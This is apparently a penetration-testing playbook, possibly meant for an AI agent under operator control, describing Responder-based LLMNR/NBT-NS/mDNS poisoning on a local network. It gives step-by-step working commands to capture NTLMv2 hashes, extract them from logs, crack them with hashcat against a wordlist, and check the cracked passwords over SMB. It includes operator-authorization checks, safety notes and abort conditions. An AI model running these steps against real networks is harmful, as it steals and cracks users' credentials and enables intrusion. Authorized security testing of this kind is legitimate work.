# Workflow: Responder Credential Harvesting

**ID:** 04_credential_harvest
**Risk Level:** HIGH — Active network poisoning (unless analyze-only mode)
**Estimated Duration:** 5-60 minutes (depends on network activity)
**Requires:** Root privileges, wired network connection preferred

## Objective

Capture NTLMv2 hashes and cleartext credentials by poisoning LLMNR/NBT-NS/mDNS name resolution on the local network. Optionally attempt offline hash cracking.

## Pre-Flight Checks

1. **Root privileges:** `whoami` — must be `root` or use `sudo`
2. **Network interface identified:** `ip addr show` — use a wired interface (eth0) if possible
3. **Responder installed:** `which responder` — should be `/usr/sbin/responder`
4. **No conflicting services:** Responder needs ports 80, 445, etc. Check:
    ```bash
    ss -tlnp | grep -E ':80|:445|:139|:88'
    ```
    Kill conflicting services if needed.

## Steps

### Step 1: Passive Analysis (Safe Start)

Start in analyze-only mode to observe network traffic without poisoning:

```bash
sudo npx tsx tactical/modules/module_runner.ts responder_poisoner \
  --interface <IFACE> \
  --analyze-only \
  --duration 120
```

**Expected:** Observe LLMNR/NBT-NS queries in stderr output.
**Record:** Note which protocols are active and how frequently queries occur.
**If 0 queries observed:** Network may not use LLMNR/NBT-NS. Try a longer duration or different interface.

### Step 2: Active Poisoning (Requires Authorization)

**CONFIRM with operator before proceeding — this is active network attack.**

```bash
sudo npx tsx tactical/modules/module_runner.ts responder_poisoner \
  --interface <IFACE> \
  --duration 300
```

**Expected:** `captured_hashes` array with NTLMv2 hashes.
**Duration:** 5 minutes minimum. Active Windows networks may yield results in 1-2 minutes.
**Record:** All captured hashes — protocol, username, hash type.

### Step 3: Hash Cracking (Optional)

If NTLMv2 hashes captured, attempt offline cracking with hashcat:

```bash
# Extract hashes from Responder logs
cat /usr/share/responder/logs/*NTLMv2*.txt > /tmp/ntlm_hashes.txt

# Crack with hashcat (mode 5600 = NTLMv2)
hashcat -m 5600 /tmp/ntlm_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

**Note:** hashcat may run slowly on RPi 5 ARM CPU. Consider transferring hashes to a more powerful system.

### Step 4: Verify Credentials (If Cracked)

For any cracked credentials, verify they work:

```bash
# If SMB access is possible
smbclient -L //<TARGET_IP> -U '<DOMAIN>\<USERNAME>%<PASSWORD>'
```

## Reporting

Summarize:

- **Network poisoning results:**
    - Protocols active: LLMNR, NBT-NS, mDNS
    - Total queries intercepted
    - Unique hosts responding
- **Captured credentials:**
    - NTLMv2 hashes: count, usernames, domains
    - Cleartext credentials: count (critical finding)
- **Cracked passwords:** username → password mapping
- **Verified access:** which credentials provide valid access

## Safety Notes

- **Analyze mode first:** Always start with `--analyze-only` to assess the environment
- **Short durations:** Use 60-300 second captures, not continuous runs
- **Network disruption:** Active poisoning may cause temporary name resolution failures for other hosts
- **Detection risk:** Modern EDR/NDR will detect Responder poisoning within minutes

## Abort Conditions

- Operator revokes authorization for active poisoning
- Network IDS alerts detected
- Responder crashes or fails to bind ports
- Interface goes down
- More than 5 minutes with 0 captured hashes in active mode (network may not be vulnerable)
